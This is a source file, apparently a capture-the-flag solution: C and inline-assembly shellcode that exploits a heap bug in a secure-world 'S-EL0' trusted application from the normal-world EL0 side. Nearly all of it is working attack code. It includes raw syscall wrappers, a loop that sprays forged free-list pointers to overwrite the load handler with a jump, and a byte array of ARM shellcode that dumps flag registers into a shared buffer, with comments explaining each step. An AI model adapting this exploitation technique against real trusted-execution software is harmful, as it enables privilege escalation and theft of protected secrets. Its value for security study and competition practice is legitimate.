//
// When compiled PIC, this code serves as a shellcode payload for
// el0.py that launches an exploit against s-el0.
//

//
// Environment setup to make coding nice; the functions are redirecting to
// functions within the el0 ELF, and the structs are from that ELF as well.
//


int main() asm("main");
asm("start: b main");

extern int _syscall(void* arg1, void* arg2, void* arg3, void* arg4, void* arg5, void* arg6, void* syscall) asm ("_syscall");
asm(
    "_syscall:\n"
    "\tmov x8, x6\n"
    "\tsvc 0\n"
    "\tret\n"
);


extern int printf(const char *fmt, ...) asm ("printf");
asm(
    "printf:\n"
    "\tmov x9, #0x400000\n"
    "\tmovk x9,  #0x0C78\n"
    //"\tmovk x9, #0x0104\n"
    "\tbr  x9\n"
);

extern int rerun() asm ("rerun");
asm(
    "rerun:\n"
    "\tmov x9, #0x400000\n"
    "\tmovk x9,  #0x05F0\n"
    //"\tmovk x9, #0x0104\n"
    "\tbr  x9\n"
);

#define syscall0(x)                   _syscall((void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(x))
#define syscall1(x, q)                _syscall((void*)(unsigned long long)(q), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(x))
#define syscall2(x, q, w)             _syscall((void*)(unsigned long long)(q), (void*)(unsigned long long)(w), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(x))
#define syscall3(x, q, w, e)          _syscall((void*)(unsigned long long)(q), (void*)(unsigned long long)(w), (void*)(unsigned long long)(e), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(x))
#define syscall4(x, q, w, e, r)       _syscall((void*)(unsigned long long)(q), (void*)(unsigned long long)(w), (void*)(unsigned long long)(e), (void*)(unsigned long long)(r), (void*)(unsigned long long)(0), (void*)(unsigned long long)(0), (void*)(unsigned long long)(x))
#define syscall5(x, q, w, e, r, t)    _syscall((void*)(unsigned long long)(q), (void*)(unsigned long long)(w), (void*)(unsigned long long)(e), (void*)(unsigned long long)(r), (void*)(unsigned long long)(t), (void*)(unsigned long long)(0), (void*)(unsigned long long)(x))
#define syscall6(x, q, w, e, r, t, y) _syscall((void*)(unsigned long long)(q), (void*)(unsigned long long)(w), (void*)(unsigned long long)(e), (void*)(unsigned long long)(r), (void*)(unsigned long long)(t), (void*)(unsigned long long)(y), (void*)(unsigned long long)(x))

#define mprotect(addr, len, prot) syscall3(0xE2, addr, len, prot)

typedef struct {
    unsigned int cmd;
    unsigned int index;
    unsigned int size;
    unsigned char data[];
} TCI;

// If somehow it's different, we could load it from 0x412760.
#define tci_handle (0x023fe000)

int tc_tci_call(int a1, TCI *a2) {
    return (int)syscall2(0xFF000006LL, a1, a2);
}

void memcpy(void *a1, void *a2, unsigned len) {
    char *dst = a1;
    char *src = a2;
    while(len > 0) {
        *dst = *src;
        ++dst; ++src; --len;
    }
}


// The heap structure from the thumb s-el0 program, not the el0.
typedef struct {
    unsigned prev_size;
    unsigned size;
    unsigned prev_ptr;
    unsigned next_ptr;
} list_node;


// Helper function, is equivalent of cmd_save() from the el0 ELF.
int do_tci_save(TCI *tci, int index, int size) {
    tci->cmd = 3;
    tci->index = index;
    tci->size = size;
    tc_tci_call(tci_handle, tci);
    if (tci->cmd) {
        // for(int i = 0; i < 0x90; i++) {
        //     static const char fmt[] __attribute__ ((section (".text"))) = "     %02x \x00\x00\x00\x00\x00";
        //     printf(&fmt[0], tci->data[i]);
        // }
        static const char fmt[] __attribute__ ((section (".text"))) = "     error saving: %x %d %s\n\x00\x00\x00\x00\x00";
        printf(&fmt[0], tci_handle,  tci->cmd, &tci->data[0]);
        return 1;
    }
    return 0;
}


// Helper function, is equivalent of cmd_load() from the el0 ELF.
int do_tci_load(TCI *tci, int index, int size) {
    tci->cmd = 3;
    tci->index = index;
    tc_tci_call(tci_handle, tci);
        for(int i = 0; i < 0x200; i++) {
            static const char fmt[] __attribute__ ((section (".text"))) = "     %02x \x00\x00\x00\x00\x00";
            printf(&fmt[0], tci->data[i]);
        }
   if (tci->cmd) {
        static const char fmt[] __attribute__ ((section (".text"))) = "     error saving: %x %d %s\n\x00\x00\x00\x00\x00";
        printf(&fmt[0], tci_handle,  tci->cmd, &tci->data[0]);
        return 1;
    }
    return 0;
}


int main() {
    char mybuf[100];
    TCI *tci = *(TCI **)(0x412770); // only works with the registerd TCI buf!

    tci->data[0] = 0x41;
    tci->data[1] = 0x41;
    tci->data[2] = 0x41;
    tci->data[3] = 0x41;
    tci->data[4] = 0x41;
    tci->data[5] = 0x41;
    tci->data[6] = 0x41;
    tci->data[7] = 0x41;

    // Malloc some stuff
    for(int i = 0; i < 4; i++) {
        do_tci_save(tci, i, 8);
    }

    // free something
    do_tci_save(tci, 2, 64);


    {
        static const char fmt[] __attribute__ ((section (".text"))) = "     phase 2\n\x00\x00\x00\x00\x00";
        printf(&fmt[0]);
    }

    //
    // Get a too-large item into the place we allocated the first thing,
    // overwriting the free node for the thing above.
    //

    //
    // The "0x4700300c" below is
    // 300d    adds  r0, #13
    // 4700    bx    r0
    //
    // After some of the do_tci_save operations below, those executable
    // bytes end up clobbering the text section near 0x122C, which is
    // the do_tci_load handler, and at a point in time where our shared
    // buffer is inside r0.
    //
    for(int i = 0; i < 500; i++) {
        // This loop just spams the address we wanted to write at, and the value
        // we wanted written there. I failed to get a "precise" version of this
        // heap exploit working, but effectively what's happening is that the
        // "0x122C - 8" and "0x4700300c" are overwriting some "previous free block"
        // and "next free block" pointers (I forget which order -_-), and the
        // malloc/free activity later causes list-insertion like behavior that
        // essentially runs *0x122C = 0x4700300c
        ((unsigned*)&tci->data)[i] = !(i%2) ? 0x122C - 8 : 0x4700300c;
    }

    // Trigger the malloc bug, and the copy of our spam above.
    do_tci_save(tci, 0, 0xFFFFFFF3);

    for(int i = 0; i < 2; i++) {
        static const char fmt[] __attribute__ ((section (".text"))) = "     phase 3\n\x00\x00\x00\x00\x00";
        printf(&fmt[0]);
    }

    //
    // This is the shellcode payload that executes *in* s-el0.
    // (as opposed to this C code itself, which is a shellcode payload
    // that executes in el0).
    //
    // This shellcode actually overwrites itself with the flag; this is
    // because this shellcode lives within the shared page between
    // EL0 and S-EL0. From EL0, we send the shellcode, and then read it
    // back out to find the flag there.
    //

// Code to load flag-containing registers and write them to [r0].
// add r0, r0, #0
// add r0, r0, #0
// add r0, r0, #0
// add r0, r0, #0
// add r0, r0, #0
// add r0, r0, #0
// mrc p15, 3, r1, c15, c12, 0
// str r1, [r0, #12]
// mrc p15, 3, r1, c15, c12, 1
// str r1, [r0, #16]
// mrc p15, 3, r1, c15, c12, 2
// str r1, [r0, #20]
// mrc p15, 3, r1, c15, c12, 3
// str r1, [r0, #24]
// mrc p15, 3, r1, c15, c12, 4
// str r1, [r0, #28]
// mrc p15, 3, r1, c15, c12, 5
// str r1, [r0, #32]
// mrc p15, 3, r1, c15, c12, 6
// str r1, [r0, #36]
// mrc p15, 3, r1, c15, c12, 7
// str r1, [r0, #40]
// MOVS            R0, #0
// str r0, [r0] // intentional segfault, it's a fine way to exit here.
// svc 0
    static const char dat[] __attribute__ ((section (".text"))) = {0,0,0,
0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x00,0x00,0x80,0xe2,0x1c,0x1f,0x7f,0xee,0x0c,0x10,0x80,0xe5,0x3c,0x1f,0x7f,0xee,0x10,0x10,0x80,0xe5,0x5c,0x1f,0x7f,0xee,0x14,0x10,0x80,0xe5,0x7c,0x1f,0x7f,0xee,0x18,0x10,0x80,0xe5,0x9c,0x1f,0x7f,0xee,0x1c,0x10,0x80,0xe5,0xbc,0x1f,0x7f,0xee,0x20,0x10,0x80,0xe5,0xdc,0x1f,0x7f,0xee,0x24,0x10,0x80,0xe5,0xfc,0x1f,0x7f,0xee,0x28,0x10,0x80,0xe5,0x00,0x00,0xb0,0xe3,0x00,0x00,0x80,0xe5,0x00,0x00,0x00,0xef,
0x00};
    for(int i = 0; i < sizeof(dat); i++)
        tci->data[i] = dat[i]; // Note: I don't think this loop mattered, just ignore it.
    do_tci_save(tci, 6, sizeof(dat)); // Trigger the free() & malloc() that writes 0x4700300c to the do_tci_load handler.

    // Copy our shellcode into the shared buffer.
    for(int i = 0; i < sizeof(dat); i++)
        tci->data[i] = dat[i];

    // The S-EL0 load handler has been overwritten with something
    // that jumps to our shellcode in the shared buffer.
    do_tci_load(tci, 0, 0);

    // Our code inside do_tci_load hex-dumps the flag (among other junk data).

    return rerun();
}

asm("end: nop\nnop\nnop\n");
